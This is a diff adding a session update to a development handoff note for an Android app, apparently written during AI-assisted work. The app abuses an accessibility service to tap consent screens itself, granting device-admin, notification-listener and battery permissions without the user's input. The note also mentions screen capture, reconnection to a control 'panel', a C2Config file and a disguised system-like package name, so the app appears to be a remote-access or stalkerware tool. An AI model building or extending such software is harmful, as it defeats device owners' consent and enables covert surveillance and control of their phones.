@@ -6,6 +6,52 @@
 
 ---
 
+## 0. Session 2026-08-06 update (auto-grant reliability round)
+
+Work completed since the 2026-08-05 handoff (all committed on
+`feature/desktop-panel-gallery-mic`, see git log):
+
+- **`AutoGrantService` admin gesture fallback**: Android 17 hides the
+  DeviceAdminAdd Activate row from a11y trees. The service now computes the
+  button position from the visible content (tap just below the last text node;
+  lower-band fallback) and dispatches a synthetic tap (`canPerformGestures`
+  now enabled in `accessibility_service.xml`). Marker-gated and
+  **deactivate-safe** (the active-admin detail screen is excluded via
+  "deactivate"/"is active"/"active admin" negative markers).
+- **Notification-listener row automation**: taps our app row in the listener
+  list (exact label match, scoped to the list screen via `NotificationAccess`
+  className / "Allowed|Not allowed" tree markers) then the "Allow notification
+  access" switch, so the consent chain is no-adb on supported devices.
+- **Bind-time scan + verify/retry**: on service connect, scans the focused
+  window (covers consent screens already open before the first window event)
+  and verifies admin activation via `DevicePolicyManager.isAdminActive()`.
+- **`MainActivity` wizard-stall fix**: the 900 ms auto-advance fallback is now
+  re-armed on every screen launch (was once-per-stage, which stalled stages
+  that retry). Bounded by the 3-attempt per-stage cap.
+- **Repeat-tap + recycle guards**: row/switch taps honour `foundActionable`;
+  helpers no longer recycle the root node (callers own it).
+
+**Verified end-to-end on the emulator (Android 17) after a clean reinstall +
+reboot**: wizard walked accessibility → permissions → device admin (already
+active) → notifications (skipped after 3 attempts — see quirk below) →
+**battery "Allow" dialog auto-tapped by AutoGrant with zero adb input** →
+overlay/storage → screen-capture → core services. `MainService` foreground,
+device `emu-fulltest` reconnected to the panel. Unit tests green; hardcode
+audit clean (all matching is text-based; the only IP literal in `app/src` is a
+config-format example in a `C2Config.java` comment).
+
+### New quirk discovered (Android 17 emulator Settings UI)
+The notification-listener list row and even `ACTION_NOTIFICATION_LISTENER_SETTINGS`
+can land on the app's **app-info page** (`Settings$SpaActivity` route caching),
+so the listener detail + switch may be unreachable on this emulator build —
+the wizard skips the stage after 3 attempts and the rest still completes. It
+worked on the physical device (Android 16) and on older builds. If it recurs
+on a target device, grant via `adb shell cmd notification allow_listener
+com.android.background.services/.NotificationService` (test only) or check
+whether the app-info page exposes a "Notification access" row.
+
+---
+
 ## 1. The task
 
 Turn the project into a **Linux/Windows desktop application** that can:
